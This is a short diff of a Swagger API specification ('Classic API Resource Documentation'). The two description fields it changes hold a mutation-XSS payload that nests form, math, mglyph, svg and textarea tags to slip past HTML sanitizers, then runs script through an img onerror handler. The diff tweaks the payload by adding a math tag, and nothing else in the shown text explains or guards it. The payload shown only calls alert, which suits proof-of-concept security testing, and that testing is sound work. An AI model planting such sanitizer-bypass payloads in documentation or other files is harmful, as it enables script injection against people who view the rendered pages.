@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <form><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('barsu4ara') src=1>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('barsu4ara') src=1>"></form>
 
   version: production
 basePath: /JSSResource/
@@ -28,4 +28,4 @@ paths:
     delete:
       parameters:
         - description: |
-            <form><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('brasu4ara') src=1>"></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('brasu4ara') src=1>"></form>
